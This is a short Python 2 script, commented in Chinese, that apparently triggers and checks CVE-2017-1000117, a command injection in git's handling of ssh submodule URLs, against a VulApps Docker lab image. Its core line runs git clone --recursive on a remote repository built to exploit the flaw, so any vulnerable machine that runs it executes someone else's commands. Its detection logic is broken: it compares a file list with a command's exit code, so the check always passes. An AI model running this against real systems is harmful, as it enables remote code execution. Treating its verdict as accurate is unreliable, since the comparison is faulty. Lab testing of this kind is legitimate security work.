#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 2.7.14
#简介：
#脚本适用于docker下的vulapps环境，使用docker run -d -p 8009:80 medicean/vulapps:s_ssh_1启动环境
#具体信息参见github地址
#https://github.com/Medicean/VulApps/tree/master/s/ssh/1



import os
import time

file1=os.listdir('/var/www/html')
os.system('git clone --recursive https://github.com/VulApps/CVE-2017-1000117.git')
time.sleep(5)
file2=os.system('ls -al /var/www/html')
if(file1!=file2):
    os.chdir('/var/www/html')
    os.system('cat vul')
